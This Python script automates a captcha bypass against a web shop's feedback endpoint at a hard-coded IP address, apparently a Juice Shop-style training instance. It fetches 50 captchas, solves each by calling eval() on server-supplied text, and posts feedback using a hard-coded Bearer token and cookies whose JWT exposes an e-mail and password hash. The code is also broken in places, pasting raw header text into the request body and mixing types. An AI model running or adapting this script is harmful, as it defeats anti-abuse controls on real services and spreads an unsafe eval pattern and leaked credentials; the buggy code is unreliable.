#!/usr/bin/python3

import os
import requests
import glob
import sys
import string

BLUE = '\033[94m'
RED = '\033[91m'
ENDC = '\033[0m'

URLGET = "http://43.241.202.33:3300/rest/captcha/"
URLPOST = "http://43.241.202.33:3300/api/Feedbacks/"

def captchasolver(mathString):
	return eval(mathString)

for i in range(0,50):
	p = requests.get(URLGET)
	captcha_id = p.text.split("\"")[2]
	captcha_id = captcha_id[:-1][1:]
	#captcha id
	captcha_string = p.text.split("\"")[5]
	#math string

	print("Return Data = [%s%s%s]", BLUE + p.text + ENDC)
	print("Captcha id = [%s%s%s]",BLUE + captcha_id + " ,")
	print("Math string = [%s%s%s]",BLUE + captcha_string + " ,")
	
	captcha_answer = captchasolver(captcha_string)
	print("Answer = [%s%s%s]",BLUE + captcha_answer + ENDC)

	a = '''User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://43.241.202.33:3000/
Content-Type: application/json;charset=utf-8
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NCwiZW1haWwiOiJBbm9ueW1vdXNAa3dpa2UubWFydCIsInBhc3N3b3JkIjoiNDQ4YWY2NWNmMjhlOGFkZWFiN2ViYjFlY2ZmNjZmMTUiLCJjcmVhdGVkQXQiOiIyMDE5LTA2LTI1VDExOjIyOjM1LjI5OVoiLCJ1cGRhdGVkQXQiOiIyMDE5LTA2LTI1VDExOjIyOjM1LjI5OVoifSwiaWF0IjoxNTYyNDY5MDI4LCJleHAiOjE1NjI0ODcwMjh9.gq7oPQyS4Hx9dOt9NDqA-_0_UpG7gWnbr0Uwy0YqtqS9JCjgdV2vDe_Ll0YeGmAMdUhx9hbFjqE4TBzgvlF6NtFbz3HaJJWLsEfk-EOEaPHvTQkMmHd9gAYw_MjhjycNvbCQlVG8I7gRPx_XLIfS_Js5jG0FGF7PeUZGAtQaNJw
Content-Length: 69
Cookie: cookieconsent_status=dismiss; continueCode=VoLJZm25zaE8lXOPWKAorHNtWcXIETlCLsKfguocL0ybn1M47QNkYBvDxqjr; io=XpbLI99IiEqaSLZkAAzA; language=en; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NCwiZW1haWwiOiJBbm9ueW1vdXNAa3dpa2UubWFydCIsInBhc3N3b3JkIjoiNDQ4YWY2NWNmMjhlOGFkZWFiN2ViYjFlY2ZmNjZmMTUiLCJjcmVhdGVkQXQiOiIyMDE5LTA2LTI1VDExOjIyOjM1LjI5OVoiLCJ1cGRhdGVkQXQiOiIyMDE5LTA2LTI1VDExOjIyOjM1LjI5OVoifSwiaWF0IjoxNTYyNDY5MDI4LCJleHAiOjE1NjI0ODcwMjh9.gq7oPQyS4Hx9dOt9NDqA-_0_UpG7gWnbr0Uwy0YqtqS9JCjgdV2vDe_Ll0YeGmAMdUhx9hbFjqE4TBzgvlF6NtFbz3HaJJWLsEfk-EOEaPHvTQkMmHd9gAYw_MjhjycNvbCQlVG8I7gRPx_XLIfS_Js5jG0FGF7PeUZGAtQaNJw
Connection: close
{"UserId":4,"comment":"asd","rating":2,"captcha":"'''

	b = captcha_answer
	c ='''","captchaId":'''

	d = a + b + c + captcha_id + "}"
	requests.post(URLPOST,data = d)
	

